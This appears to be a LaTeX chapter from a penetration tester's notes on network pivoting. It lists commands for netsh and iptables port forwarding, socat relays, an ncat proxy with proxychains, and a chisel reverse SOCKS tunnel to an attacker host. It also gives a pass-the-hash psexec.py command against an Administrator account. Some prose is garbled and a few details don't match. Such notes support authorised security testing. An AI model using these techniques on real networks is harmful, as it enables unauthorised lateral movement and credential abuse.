\chapter{Pivoting}

{\bf Pivoting} is essentially the idea of moving to other
 networks through a compromised host to find more targets on different network
 segments.

 There are many different terms used to describe a compromised host that can be
 used to pivot to a previously unreachable network segment. Some of the most
 common are:
 \begin{itemize}
     \item  Pivot Host
     \item  Proxy
     \item  Foothold
     \item  Beach Head system
     \item  Jump Host
 \end{itemize}


Pivoting's primary use is to defeat segmentation (both physically and
virtually) to access an isolated network. {\bf Tunneling}, on the other hand, is a
subset of pivoting. Tunneling encapsulates network traffic into another
protocol and routes traffic through it.


\input{misc/pivoting/port-forwarding}

\subsection{Firewall Port forwaring}
These actions are performed on the pivot.

\subsubsection{Windows netsh}
Firewall rule
\begin{verbatim}
# Allow inbound traffic flow on port 4444/TCP
netsh advfirewall firewall add rule 
    name="Allow L_PORT" dir=in action=allow protocol=TCP localport=L_PORT
\end{verbatim}

Port forward:
\begin{verbatim}
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=L_PORT \
    connectaddress=IP connectport=PORT
\end{verbatim}

clean:
\begin{verbatim}
netsh advfirewall firewall delete rule 
    name="Allow 4444" protocol=TCP localport=4444
netsh interface portproxy show v4tov4
\end{verbatim}

netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8443

for incoming (nmap\ldots)
\begin{verbatim}
netsh interface portproxy add v4tov4 listenaddress=IP_P listenport=L_PORT \
    connectaddress=IP_T connectport=T_PORT
\end{verbatim}

\subsubsection{Linux }

\begin{verbatim}
 iptables -t nat -A PREROUTING -p tcp --dport 4445 -j DNAT --to-destination target:445
\end{verbatim}

\subsection{socat}

\begin{verbatim}
 socat.exe tcp-listen:4445,fork tcp-connect:IP_T:445
socat -v tcp-listen:8079,reuseaddr tcp-connect:IP_T:9090
\end{verbatim}


Port forwarding has a limitation: it’s a static operation, and you have to do a separate forwarding for each ip:port combination. Normally, you need this only at the initial stage to bypass the firewall. But if you need a fully functional and handy access to a network segment via the compromised PC, you have to use a proxy.

\section{Proxy pivoting}
\subsection{SOCKS proxy and Meterpreter}
Like SSH, meterpreter can turn into a sock intermediary, it has been discovered that it is less reliable than SSH. Shockingly, socks4 proxies just for the most part support TCP conventions, and specific sorts of traffic won’t function admirably, so full Nmap and comparative tools utilization may not be conceivable.


\subsection{ Tunnel as http (socks5) proxy with ncat}

ncat can be setup as an http proxy which can be used similar to a socks proxy. Just run the ncat proxy on the target machine, and update the local proxychains config to use an http proxy.

Unfortunately, ncat is almost never going to be installed by default on a target machine, unless someone has also installed nmap there.
\subsubsection{Target machine - setup ncat listener}
\begin{verbatim}
ncat -vv --listen 3128 --proxy-type http # or socks5
\end{verbatim}
\subsubsection{attacker machine}
\begin{verbatim}
tail /etc/proxychains.conf -n 3
# defaults set to "tor"
#socks4 	127.0.0.1 9050
http 172.21.0.3  3128 # 172.21.0.3 is the IP of my ssh machine

proxychains nmap -sT -P0 -p8080,9001 172.20.0.2
\end{verbatim}

\subsection{chisel proxy}
\url{https://ppn.snovvcrash.rocks/pentest/infrastructure/pivoting#chisel}

\url{https://ap3x.github.io/posts/pivoting-with-chisel/}

on the attacker
\begin{verbatim}
chisel server -p 8001 --reverse
\end{verbatim}

edit \verb+/etc/proxych+ to happen \verb+ socks5   127.0.0.1:1080+

on the pivot

\begin{verbatim}
create a reverse proxy and open port 1080 on attacker
chisel client IP_ATTACKER:8001 R:socks
\end{verbatim}

on the attacker:
proxychains nmap\ldots
\begin{verbatim}
proxychains4 psexec.py -hashes 00000000000000000000000000000000:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
\end{verbatim}


\section{VPN pivoting}

\section{links}
\url{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md}
\url{https://hackmag.com/security/windows-pivoting/}
\url{https://salmonsec.com/cheatsheet/network_pivoting}
\url{https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019}
\url{https://miloserdov.org/?p=2973}
\url{https://hackmag.com/security/windows-pivoting/}
\url{https://salmonsec.com/cheatsheet/network_pivoting}
\url{https://archive.ph/LnvIQ#selection-2127.0-2127.46}
\url{https://artkond.com/2017/03/23/pivoting-guide/}
